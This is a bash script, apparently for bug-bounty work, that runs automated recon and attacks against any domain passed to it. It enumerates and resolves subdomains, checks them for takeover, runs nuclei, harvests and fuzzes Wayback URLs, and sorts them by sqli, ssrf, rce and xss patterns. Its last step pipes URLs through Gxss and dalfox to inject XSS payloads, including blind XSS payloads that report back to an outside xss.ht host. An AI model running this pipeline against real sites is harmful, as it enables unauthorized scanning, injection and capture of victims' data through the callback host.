#!/bin/bash

domain=$1
wordlist="/root/Wordlist/deepmagic.com-prefixes-top500.txt"
resolvers="/root/Wordlist/resolvers.txt"

domain_enum(){

mkdir -p $domain $domain/sources $domain/recon $domain/recon/nuclei/ $domain/recon/waybackurl $domain/recon/ffuf $domain/recon/gf $domain/recon/dalfox $domain/recon/Gxss
echo "Making Dir Done"

subfinder -d $domain -o $domain/sources/subfinder.txt
echo "Subfinder Done"
assetfinder -subs-only $domain | tee $domain/sources/assetfinder.txt
echo "Assetfinder Done"
amass enum -passive -d $domain -o $domain/sources/amass.txt
echo "Amass Done"
shuffledns -d $domain -w $wordlist -r $resolvers -o $domain/sources/shuffledns.txt
echo "shuffledns Done"
cat $domain/sources/*.txt > $domain/sources/all.txt

}

domain_enum

resolving_domain(){

shuffledns -d $domain -list $domain/sources/all.txt -o $domain/domains.txt -r $resolvers
echo "shuffledns resolving Done"
}

resolving_domain

domain_subz(){
mkdir  $domain/recon/Takeoversub
subzy --targets  $domain/domains.txt --hide_fails | tee $domain/recon/Takeoversub/subzy.txt
subover -l  $domain/domains.txt | tee $domain/recon/Takeoversub/subover.txt
}
domain_subz






domain_http_prob(){
cat $domain/domains.txt | httpx -threads 200 -o $domain/recon/httpx.txt
echo "httpx Done"
}

domain_http_prob
domain_nuclie(){
   cat $domain/domains.txt | nuclei -t /root/nuclei-templates/ -r $resolvers -o $domain/recon/nuclei/result.txt
echo "Nuclie DOne"
}


domain_nuclie


domain_waybackurl(){
cat $domain/domains.txt |waybackurls > $domain/recon/waybackurl/allurltemp.txt
cat $domain/recon/waybackurl/allurltemp.txt| egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpeg|\.jpg|\.svg|\.css|\.ico" |sed 's/:80//g;s/:443//g' | sort -u |urldedupe >> $domain/recon/waybackurl/waybackvalid.txt


}
domain_waybackurl


domain_fuffer(){
ffuf -c -u "FUZZ" -w $domain/recon/waybackurl/waybackvalid.txt -of csv -o $domain/recon/ffuf/ffuftempall.txt
cat $domain/recon/ffuf/ffuftempall.txt |grep http | awk -F "," '{print $1}' >> $domain/recon/ffuf/validffuf.txt

}
domain_fuffer

domain_gf_patterns(){

stringList=debug_logic,idor,img-traversal,interestingEXT,interestingparams,interestingsubs,jsvar,lfi,rce,redirect,sqli,ssrf,ssti,xss

# Use comma as separator and apply as pattern
for val in ${stringList//,/ }
do
   gf $val $domain/recon/waybackurl/waybackvalid.txt |tee $domain/recon/gf/$val.txt
done
}
domain_gf_patterns


gxsss(){
cat  $domain/recon/gf/xss.txt|Gxss -p BITCH |dalfox pipe -o $domain/recon/dalfox/result_xss.txt
#Note add your Own domain after --blind 
cat  $domain/recon/gf/xss.txt|Gxss -p BITCH |dalfox pipe --blind https://mohanlal11.xss.ht  -o $domain/recon/dalfox/result_blind.txt
}
gxsss
